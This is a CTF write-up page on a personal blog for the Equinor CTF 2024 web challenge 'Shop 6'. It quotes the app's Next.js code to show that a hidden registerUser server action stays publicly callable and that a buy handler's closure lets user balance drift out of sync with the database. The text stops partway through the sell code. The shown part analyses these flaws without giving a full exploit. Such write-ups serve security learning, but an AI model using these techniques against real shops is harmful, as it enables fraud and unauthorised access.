<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />

    <!-- *** favicon *** -->
    <link rel="icon" type="image/svg+xml" href="../favicon.svg" />
    <link rel="apple-touch-icon" sizes="180x180" href="../apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="../favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="../favicon-16x16.png" />
    <link rel="mask-icon" href="../safari-pinned-tab.svg" color="#523fce" />
    <meta name="msapplication-TileColor" content="#ffffff" />
    <meta name="theme-color" content="#ffffff" />

    <!-- *** common *** -->
    <meta property="og:type" content="https://shirajuki.js.org/logo.webp" />
    <meta property="og:url" content="https://shirajuki.js.org/" />
    <meta property="og:title" content="Shirajuki - A CTF player from Norway, @iku-toppene, @bootplug, @corax, @rumbleinthejungle and @cybersalmons" />
    <meta property="og:site_name" content="Shirajuki" />
    <meta property="og:description" content="Shirajuki - A CTF player from Norway, @iku-toppene, @bootplug, @corax, @rumbleinthejungle and @cybersalmons" />
    <meta property="og:image" content="https://jonny.js.org/logo.webp" />
    <meta property="og:locale" content="en_EN" />
    <!-- *** Twitter *** -->
    <meta name="twitter:card" content="Shirajuki - A CTF player from Norway, @iku-toppene, @bootplug, @corax, @rumbleinthejungle and @cybersalmons" />

    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta http-equiv="content-security-policy" content=""><title>Writeup: Equinor CTF 2024 - 🔥 Shop 6 🔥</title><meta property="og:title" content="Writeup: Equinor CTF 2024 - 🔥 Shop 6 🔥" data-svelte="svelte-15w3rt">
	<link href="/_app/immutable/assets/__layout-58a37c92.css" rel="stylesheet">
	<link href="/_app/immutable/assets/layout-5b9c754d.css" rel="stylesheet">
	<link rel="modulepreload" href="/_app/immutable/start-d5519fbe.js">
	<link rel="modulepreload" href="/_app/immutable/chunks/index-f2a82808.js">
	<link rel="modulepreload" href="/_app/immutable/chunks/index-36b86faa.js">
	<link rel="modulepreload" href="/_app/immutable/pages/__layout.svelte-e154bb9b.js">
	<link rel="modulepreload" href="/_app/immutable/chunks/stores-1686c5b9.js">
	<link rel="modulepreload" href="/_app/immutable/chunks/index-57d47233.js">
	<link rel="modulepreload" href="/_app/immutable/pages/blog/equinor-ctf-2024-shop-6.md-a9709bfd.js">
	<link rel="modulepreload" href="/_app/immutable/chunks/layout-d6e193e1.js">
	<link rel="modulepreload" href="/_app/immutable/chunks/utils-e126d158.js">
  </head>
  <body style="position: relative;">
    <div>


<header class="show svelte-fvi1vf"><div class="corner svelte-fvi1vf"><a sveltekit:prefetch href="/" class="svelte-fvi1vf"><img src="data:image/webp;base64,UklGRqIPAABXRUJQVlA4IJYPAADwPQCdASqAAIAAPm0qkUakIiGhLRYt4IANiUAZC0Arp9FM5vFO2s+j6G86f+59VO3F8w/mkf8v1772N6HdAz9+eAPka9fe3HMRiO/JPwt/D/vPoz4F/H/tA+Qj2B/nuAlAH+g/2j/i/3zkz+zH+q9Fz/P8i76L7A380/pn/Q/xHsc/+H+g/JX3SfTf/Z/yHwEfzX+z/8//Bdo/90vZJ/cVHfY6Rrbv/cvs8L8lqaX9Gd/HtFOs73tc6o6ih0irdz2ksYkhkjnE1ANI50M7wpBfpM89Y5WN+e3qilzN6ySznm+K2GkmI1pV9SbPXBDP8U3Tgj96L+zn3Hh3tvhSTu7ffx/AXtOFAuVsp1GgMP3dWc+lF0t3OLEg1pvTCf+qIeDyET0L2wQpT+hqNmJzHDpvfEKqh4XQT1Y+qIWnKAcYd6p9WgQrAxjfK5pDDlauK8fNdu+7VD7tpESQapq5lc3uwIPKxxoZlRDcOJVlbhvltzHN/VaijlOMPW3jLjO5wrDd17ZnDapXE5p8OLIK+Kv+zCyS3k3IcoZ0fOSsveneXA7WFh/O3brbplgJjdFDLsPMwS8mWFCYgvxOiCtkUC+lw9GGJWnuJBsmDBK9/YdPZ+S0+klS2SQ5ce30Hezwaide2Zn8TlLRA9DzCBurtUsU5SykbNzFEAAA/vg8w8F4K7cIZpK9ObN9BWhoRZj+ZzClwc1+3JR8vtCTww3ugTvVLvf+TTNba/vudX+OHj+tj+exHRt+beL4PUAa4HHsk0aSZnQW2aJf4X6SRMvzIhQLF5v4DekSL3J9HZg55590C+Y+CidmMusXqiJ/r1v1LyVCYbOpk5WFP+iu3us7+mbiB0b/xyggt6xrxRCIRJDk4hSgUh3hYVK3LW7zUy4GJOguITJeqUcywYHd36AdnzTnRqWv8pmhT9IkrxjPgwuTJRHJs366d9BrDyXalXgHSZqJheRJTQR8V4NOzS2oV4loFvXKPwcV2hSaQ3aQM3TYHlLH0lSbVBluIAAqgeJtZH3HbhHeL9zd0TbSYZH402Zo4cxqRaZuZjtJbNa2wlsWMZHUQeyzGHtmebXveD09uiCNt071YXp7WO7hTD9HRayzCofneP8GI3NYxVQGkInRtB4dpj0GE9ymn9PAXMT/qOG0BdT92hXxnwRd8ytKCq4luJ5vKGX4L7htGnDgJD/VISzXCmm3ob+/vAFPxVivy0DmN+PQ9RCWDobpH1X/WeppH/BgJEx6Xdu+ENMZogfUcfFFKw4btOTNlr618DU0lhXCCYoJ0fFBhLqixR8ISVoHkUt+acLKn88vt6dfCkHAIX/5+exAYIkugF7pXkWgkMq1sElCmYWS71tCI97KKQSovjVBgAoC52Kb3Y9odEigu66a9yl1fCXS4I2gwvNl4XgV9KGBG/RCdo3c9UdcRyW286W12oqFKgBkm2ICEBHhbKIfa5r/RdAeZ0bIJGXLGfKPh2wivC7MeP4mpco3lk7oKo0YJAZKcEn1BtKoMSbhEyj7W1NYNYX0QYp1mccEZCsUGOme2w9Pv2z30ExTvN6pNaLPkBHWcMFSSRpHfGG3zkZkylAseivENYm8hnfEaw37dGH/qFp+x9QsGeAc1wA+uwYhUWjHeVAAlT+eLzrP/ZWauK1Q7iU+mQAHyqxQQl50akRClOQnzFt8YZdpAsp93/4b19XWTNTYPTm3V5BlBJ9HZXITgIiKG0XKQTj6DfcVU5os74On2d0i2Za9+3Hv+Qq3tATWXTlrQSk+0x5HS2lacmbCf/V6qeT3kaqKwT7R1ZaRWFk38Fdgz6tbVCFcf6qUJpFpqrefR9AZb8k9vWVZN5nfo5KOIJex66GdPyiVlWBpdhtv1L98FSqzZRfGNsTB2h+Dq2LlC/g+2vihRbyvQpcIQaM6Tm2vVFQ69FGdybGMpw3ehmjPgYsHNNtEOeAXH/JHJlhFvLvZC6t22akv70I9ajU0mFPRsTs/hG74+TGsCMhxgYADuYmAaQWW81l3JAkV6/6JSebuT+f9px1dIc2NTRsCfGUwJH38iHmudWsxATsD7yRmKjySKeKxEPQIiQukRHxLvUe2z40Xgkt54xv6LISdDBdDg47j9plc1hMjmUACIG/tLmTTP8bez9xe9kGI5/yekHreLqTraGKg8kjYewCbutLDGWZmBkZpLUDu6rNSvs57ecAt9mzjX7CquOo7puEqSk/YgtwJL7963HDR4Zgd3etwjRbNo0lUP5JPXLlct5g+mUymVyQwI9kugD3NWbbQldJ+XXSMObq9+6memPW9J/LVzplJk7jbl4hsqM7t9WBSUmR6ZhEJgiF8uEXNIHx+BROVNqfi+ubroloMr3HF9/HjgUi/dqSg/+02lMCutigrb5tG3/EFqRWtyFYeDdMpafYUVFW/lv3RBziiDtiBH34m/VaR+OgcZZljMyHybne0mZpQKV5LEvRxyDu91jHLAVEbHaIkZ+RPyg+SglH1PuFeHaKPcnzVYFtgARiVQ26nzwQkET2Akb4Qp2Mn/y505xgobNkZiJ4PLh2+O4jmYpm0RvKnqGwIB5n+pL0c4Dl7HrZ3HHNMdHrNiu5S0tb7scCJ5CqZZxNYIezyYytpN1WsQuNHLKDtApNOHi5MZDkpLzfzZgdZoafoBivLCEAEkzTeCAYuPDkdBNyb/4EPcmfmxmLAQcYrRaGTGbkwYLGt+jCNiAzlX5kcQCAJUS0PBBqHHFQXje6Q245HwiGb67eu7nTqh2qmZHUbNALFKiehbUh9Kt1azsugdH6jc93XHoBKWeN6gNLVxxm3L7IfSOxcUH9Wixihn3ShtfWfbz6r3TLfOMpF3Js87E6FJpEidSDBJ10gVj7ueyhHIWOt3llxqLf18J1I5NTX4PZZ8XtlsZe91l062y6IbfvVgxjL+guu1HJS0aD9/jGF082m34uNk2jY9zCi7XkfWUJg/H15CdJYGYdMmIEMQZzzsXyPbIeT8Vfu5p3IvKIlTG5+XG757a22Flm4Wdio6zTjK9Z77Xl4HAq53zs8GIMwOrPAvq/Z+b0g5j7vfOPFHUoPg3Uc7vqLBRe2DD1ovDebA7po6haxTETYiP7C8DBw28tVqbxjODtpWz/oBgw5ee211VGhzxSnnGqt2J8LdxVz//5KnEdNy7VqNeYuw8sZVbYRn50+shuUd8MUj68A7KbDrPx30e5BsgJlKt/7bqji1yo0dt7VOMYXJgGX/SoUwNULECC12al2OR6FUj84UqpgBk4mvqSB63mt3rP1OMO4rh/fzJz6eqn2wjGUOp8QGjagfqwIPH8NROOxtk9kwV3rLgGlXalOmICEp9fLq8+Dq6t6s9UHQ6NiSllS7KkEBFFHXctuFXn9GMzWans84w154YTLP91b+5YW2ouLMniZTI+rPtYJgF/ijhu+1ZoCI5GC+Kc7uHoG12/21xZN2Zxgdsj3fJwVkmngQh8M0BL526jufifnUKirrmDHXKuFcWrzpKEd1K6oryKAQ9fMv1ynXMcCTM+cxgE9BlkopEDNCLbuO23wMehM8++7KiFIc1FRBZtG2cvKs4Zjx7Y1SOZe3uLoQIhyB0yvDSlOElFr5EAwJxbJquL34HqzGtvPlLpRnBGIMxg4DiV+Y02FnY9viFGxOgK5Ij82LrNKerld4wPXP2MN9gCB8tDcDzrrdRY9+FK4pFaKPDx6QZderE7iyhBRDgL8NyRDckrECvIUvKvXLgB+rvLqvfWYSdwGE+1aHd1ai6IxjsvnnURIDsSkUHv2d+SBvDUhIPIdHMcS3zR2KCPH11oFuRhoicAmkaXwzyQ/UbUWfrRbDYI2vrzIYHy+75xaXJSJcAD/6htI2r708S02af6TuoF/QLe/Oi2lIWkGCnxTQDxn/C46gYEc4icHDuVvYdCUMCXmUBMyVPcr0tVBrfZUz5zOrrBC5QEKD1y2/seumSH9TC8zHBY0ZDrAvpD7Sg3jbCVRupNbrtOvw+k/KxwxGB2EGZCtz2BMPHCFZLBwiJq9U+90S9rq6ppLiM8CBGPUFxRr0i/cI3r5/05OlXJCxlAsZePzWeIJac4ReGgtklRzASoKgdADiFIRegzDi0n8aMk1oKgz3ORuRSE03Ed3cEkWlYELSQ6vTPX+dezoHpv7cuK0L+Wb1Ykf60e5ofMqI2ql0r2w5n6zyV+OpvXuFc2b0KZcCm6KfzsCTLroDeUERN8uusKdYBhLBK80ADQNcUh4AhyBvX32KTbQYomVP4xTqWhXFUnqBZQyiL3IN3dh0WEZj/bpQggyiwDhuyz0gmoodMIy8tOUQco7wFkzS3LUd/U5VRdub6wdvlD4q5yea5Oot93kJ46wZ3r+D09k9C4d7O8gjYvot3C+5SrpvnThNDW+UD+5BOseACSDfeu4e3/FvsTLki2IKCec1jv8UzPeChJ6u8ncsGGDhW/LdrOJJ+AlPMKou9fGvYSXxQTVsXV0b8mn8ggqcGneJx6t6DSj6iLjc5EeAC1MUddS6u1crVNFmC37bKZb5muRcIukOUGOj/sRFwlo+cLT2Bq8h/HmeCXdTfTxH8vQd0zidQZXtn4GYHvxjvrvtvUm5KTn+vE7SE5fVrVoGOy9a4eVP1xxoXMUI/CRZb2ZsYuEXgGXQ2voxAJg3wy4peTCRVUvvcGteL6FXnTL3Kct0zceFH3LL7/+KIIRKST2RVarxAWVnHQxUHoFsdcNBL1AHmvGOSkbmCi2Vcw/3T6gjck5hyKAwKAX+FxqcIzWbgNfh5ACL9fEXGIKavqTeSpki0SZ0mfl8eG7kpCd6nHOc3h+4hMHfccVIOgl7tEkKP4g/Cke6O9p0WHbFrnC+TOqcovc4E+G+5seP4RarbIJGVDrk4x5cVO8EwVzIu3Zxb//ypYVlkrpGnwa/GGGdiTtaFa+ABmOsvpEXoTX6RxfAtf7pHPdGGXmRGrNyq2JIhqa18eJw5QTofL1mmjEycJo4m++6SFvNllGu0y+pEpQ+jiEdQAjfFDZ0QSggCKunhAF34i/d3tMRTSQZuxz29LX836NTX+Sax9kQG/daDS/xSUh5XksbiA7CudsSJnP5LjRMlkRWfMH75Rul1BprsKAJHOuXf+XGMaVU9jx/ICnYUiAtYKNrqg4Yw5KuFzE9Hio2hG7//GGiMeecYa3L+r1AhPuqnpI8M65hK42olgOfha7KklNrdzFfsbSLzXrBqPH0DNzGzcw82ZkirfRTa6sbsEUMzh90YYAR6S75IIy8+UGo/xniarAQ30sB9TKov1TJwUH0wS+JomzuORLWTGgRwVH6VhiW/MSgODXryYd81otLMAAAAA=" alt="Logo" class="svelte-fvi1vf"></a></div>

  <nav class="svelte-fvi1vf"><ul class="svelte-fvi1vf"><li class="svelte-fvi1vf"><a sveltekit:prefetch href="/" class="svelte-fvi1vf">Home</a></li>
      <li class="svelte-fvi1vf"><a sveltekit:prefetch href="/about" class="svelte-fvi1vf">About</a></li>
      <li class="svelte-fvi1vf active"><a sveltekit:prefetch href="/blog" class="svelte-fvi1vf">Blog</a></li></ul></nav>

  <div class="corner svelte-fvi1vf"></div>
</header>



<main class="svelte-10fak7s">

<section class="content"><div><h1>Writeup: Equinor CTF 2024 - 🔥 Shop 6 🔥</h1>

  <p><b>Date:</b>
    November 10, 2024</p>

  <p><b>Category:</b>
    <span><a href="/blog/category/writeup">writeup</a></span></p>
  <p><b>Tags:</b>
    <span><a href="/blog/tags/writeup">writeup</a>
      </span><span><a href="/blog/tags/equinorctf">equinorctf</a>
      </span><span><a href="/blog/tags/nextjs">nextjs</a>
      </span><span><a href="/blog/tags/server-actions">server-actions</a>
      </span></p></div>

<section class="toc svelte-11y9tvd"></section>

<div class="wrapper svelte-11y9tvd"><h2 id="introduction"><a href="#introduction">Introduction</a></h2>
<p>🔥 Shop 6 🔥was a web challenge and one of six fire challenges in Equinor CTF 2024, authored by null. To solve this challenge, it was necessary to make use of Next.js Server Actions’ trait of being publicly accessible to the client. Additionally, there was a logical flaw in implementing the item purchasing functionality, where Server Actions acted as closures, essentially leading to a desynchronization between the user’s state and the database.</p>
<p>This CTF challenge was also white box, meaning the source code and necessary Dockerfiles were provided. Along with the source code, we also received a URL directing us to the live server.</p>
<p>The challenge description is as follows:
<img src="https://raw.githubusercontent.com/Shirajuki/equinor-ctf-2024/refs/heads/main/writeups/web/Shop%206/Iku-toppene/assets/1-challenge-details.png" alt="challenge details"></p>
<h2 id="overview"><a href="#overview">Overview</a></h2>
<p>Upon reviewing the hosted web application, we get a clearer idea of what the challenge is about. It is more or less very similar to challenges under the same series, like <code>Shop 4</code> and <code>Shop 5</code>, where the premise and goal is to purchase a specific item containing the flag. However, a major difference in this challenge is that we cannot seem to register an account from the get-go. This is where the provided source code and Dockerfiles came in handy.</p>
<p><img src="https://raw.githubusercontent.com/Shirajuki/equinor-ctf-2024/refs/heads/main/writeups/web/Shop%206/Iku-toppene/assets/2-home-page.png" alt="challenge homepage"></p>
<p><img src="https://raw.githubusercontent.com/Shirajuki/equinor-ctf-2024/refs/heads/main/writeups/web/Shop%206/Iku-toppene/assets/3-register-page.png" alt="challenge registration page"></p>
<h2 id="analysis"><a href="#analysis">Analysis</a></h2>
<p>Knowing that we need to figure out a way to enable user registration first to proceed to the application’s functionalities, we can start by reviewing the code responsible for handling this functionality. The first hint we can see when doing so comes from the commented-out JSX snippets in the source code, intended to handle the registration form.</p>
<pre class="language-tsx"><!-- HTML_TAG_START --><code class="language-tsx"><span class="token string">'use server'</span><span class="token punctuation">;</span>
<span class="token comment">/* eslint-disable @typescript-eslint/no-unused-vars */</span>

<span class="token keyword">import</span> <span class="token punctuation">&#123;</span> registerUser <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'../actions'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">Register</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  searchParams<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">readonly</span> searchParams<span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span>key<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token builtin">string</span> <span class="token operator">|</span> <span class="token builtin">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">|</span> <span class="token keyword">undefined</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> error <span class="token operator">=</span> searchParams<span class="token punctuation">.</span>error <span class="token keyword">as</span> <span class="token builtin">string</span> <span class="token operator">|</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row justify-content-center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
          </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card shadow-lg border-0 rounded-lg mt-5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-header bg-primary text-white<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
              </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-center font-weight-light my-4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">Register</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span><span class="token plain-text">
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-body<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
              </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert alert-danger mb-4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
                To combat a rise in security incidents in the previous generations of EPT shop, we have temporaraly
                closed the registration. Please try again tomorrow.
              </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
          </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">/*
  return (
    &lt;div className="container">
      &lt;div className="row justify-content-center">
        &lt;div className="col-md-6">
          &lt;div className="card shadow-lg border-0 rounded-lg mt-5">
            &lt;div className="card-header bg-primary text-white">
              &lt;h3 className="text-center font-weight-light my-4">Register&lt;/h3>
            &lt;/div>
            &lt;div className="card-body">
              &#123;error &amp;&amp; &lt;div className="alert alert-danger mb-4">&#123;error&#125;&lt;/div>&#125;
              &lt;form action=&#123;registerUser&#125;>
                &lt;div className="mb-3">
                  &lt;label htmlFor="username" className="form-label">
                    Username
                  &lt;/label>
                  &lt;div className="input-group">
                    &lt;span className="input-group-text">
                      &lt;i className="bi bi-person-fill">&lt;/i>
                    &lt;/span>
                    &lt;input type="text" className="form-control" id="username" name="username" required />
                  &lt;/div>
                &lt;/div>
                &lt;div className="mb-3">
                  &lt;label htmlFor="password" className="form-label">
                    Password
                  &lt;/label>
                  &lt;div className="input-group">
                    &lt;span className="input-group-text">
                      &lt;i className="bi bi-lock-fill">&lt;/i>
                    &lt;/span>
                    &lt;input type="password" className="form-control" id="password1" name="password1" required />
                  &lt;/div>
                &lt;/div>
                &lt;div className="mb-3">
                  &lt;label htmlFor="password" className="form-label">
                    Confirm Password
                  &lt;/label>
                  &lt;div className="input-group">
                    &lt;span className="input-group-text">
                      &lt;i className="bi bi-lock-fill">&lt;/i>
                    &lt;/span>
                    &lt;input type="password" className="form-control" id="password2" name="password2" required />
                  &lt;/div>
                &lt;/div>
                &lt;div className="d-flex align-items-center justify-content-between mt-4 mb-0">
                  &lt;button type="submit" className="btn btn-primary">
                    Register
                  &lt;/button>
                &lt;/div>
              &lt;/form>
            &lt;/div>
            &lt;div className="card-footer text-center py-3">
              &lt;div className="small">
                &lt;a href="/login">Already have an account? Sign in!&lt;/a>
              &lt;/div>
            &lt;/div>
          &lt;/div>
        &lt;/div>
      &lt;/div>
    &lt;/div>
  );
  */</span>
<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>Since most of the JSX code is commented out, the imported server action <code>registerUser(formData: FormData)</code>, intended to handle user registration, seems to be unused. The code for the server action looked as follows:</p>
<pre class="language-ts"><!-- HTML_TAG_START --><code class="language-ts"><span class="token comment">// app/actions.ts</span>
<span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">registerUser</span><span class="token punctuation">(</span>formData<span class="token operator">:</span> FormData<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> username <span class="token operator">=</span> formData<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> password1 <span class="token operator">=</span> formData<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> password2 <span class="token operator">=</span> formData<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'password2'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">string</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>password1 <span class="token operator">!==</span> password2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/register?error=Passwords do not match'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">const</span> existingUser <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getUserByName</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>existingUser<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/register?error=User already exists'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">const</span> token <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> hashedPassword <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>password1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">createUser</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> hashedPassword<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login?success=Registration successful! Please log in.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/register?error=Something went wrong, please try again.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>From the looks of it, the only way of registering a user is through triggering this said exported server action with the required FormData parameter. And when once registered, we should then have access to the shop’s intended functionalities, including buying and selling items.</p>
<p>However, there seems to be an additional hurdle after the registration, specifically in the selling functionality where selling items requires a retailer role, which we don’t initially have. Let’s keep on tracing.</p>
<p>The following are the codes for the buy and sell functionality respectively:</p>
<pre class="language-tsx"><!-- HTML_TAG_START --><code class="language-tsx"><span class="token comment">// app/components/ItemCard.tsx</span>
<span class="token operator">&lt;</span>form
  action<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token string">'use server'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token operator">?.</span>money <span class="token operator">>=</span> item<span class="token punctuation">.</span>price<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">addItem</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setMoney</span><span class="token punctuation">(</span>user<span class="token operator">?.</span>money <span class="token operator">-</span> item<span class="token punctuation">.</span>price<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">&#96;</span><span class="token string">/?error=Insufficient funds to buy </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>item<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">&#96;</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">&#96;</span><span class="token string">/?login&amp;error=You need to login in order to buy </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>item<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">&#96;</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token operator">></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
    Buy
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code><!-- HTML_TAG_END --></pre>
<pre class="language-tsx"><!-- HTML_TAG_START --><code class="language-tsx"><span class="token comment">// app/items/page.tsx</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span>
